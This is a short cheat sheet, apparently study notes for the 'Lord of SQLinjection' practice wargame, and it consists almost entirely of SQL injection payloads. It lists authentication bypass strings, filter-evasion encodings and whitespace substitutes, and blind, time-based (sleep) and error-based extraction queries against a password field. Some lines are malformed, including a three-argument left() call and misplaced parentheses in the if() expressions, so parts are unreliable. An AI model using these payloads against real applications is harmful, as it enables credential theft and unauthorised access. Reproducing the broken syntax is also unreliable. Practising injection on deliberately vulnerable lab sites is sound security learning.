# Lord-of-SQLinjection
#web_hacking #SQLinjection

?pw=' or 1=1 --%20  
?pw like "a%"  
?pw like "a_b_c"  
?id in ("admin")  
or -> ||  
and -> %26%26  
admin -> 0x61646d696e  
0x -> 0b  

<h4>bypass ' '</h4>
%09 (\t)  
%0a (\n)  
%0d (\r)  
%0b  
%0c  

<h4>Blind SQL injection</h4>
length(pw)<10  
ord(substr(pw,2,1)) > 5  
substr(pw,2,1) > char(5)  
substring(pw,2,1) > char(5)  
substr(pw from 2 for 1) > char(5)  
ord(right(left(pw,2,1)))>5  

<h4>Time-based SQL injection</h4>
if((ord(substr(pw,2,1)>5), (sleep(2)), 1)  
id='admin' and length(pw)=10 and sleep(2)  
pw=(sleep(3*(length(flag)=10)))  

<h4>Error-based SQL injection</h4>
if(ord(substr(pw,2,1)>5, (select 1 union select 2), 1)  
order by (select 1 union select length(pw)<10)  

<li>limit 0,1</li>
<li>and>or</li>
<li>if there is # -> use Line Feed!</li>
<li>if you want to make the query error, pw=1=(select 1 union select 2)</li>
<li>ereg -> %00, case sensitive</li>
